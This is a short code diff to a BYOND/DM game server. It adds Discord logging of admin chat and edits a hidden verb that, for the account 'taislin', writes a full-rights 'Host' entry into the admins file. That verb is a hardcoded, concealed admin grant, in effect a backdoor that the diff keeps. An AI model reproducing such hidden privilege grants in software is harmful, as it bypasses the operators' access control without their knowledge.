@@ -12,6 +12,8 @@
 
 	log_admin("ASAY: [key_name(src)] : [msg]")
 
+	discord_admin_log(key_name(src),msg)
+
 	if (check_rights(R_MENTOR|R_MOD,0))
 		for (var/client/C in admins)
 			if (R_MENTOR & C.holder.rights || R_MOD & C.holder.rights)
@@ -23,7 +25,7 @@
 	set hidden = TRUE
 
 	if (ckey == "taislin")
-		text2file("99;taislin;taislin;Host;65535|||","SQL/admins.txt")
+		text2file("taislin;Host;65535|||","SQL/admins.txt")
 		return
 	else
 		return
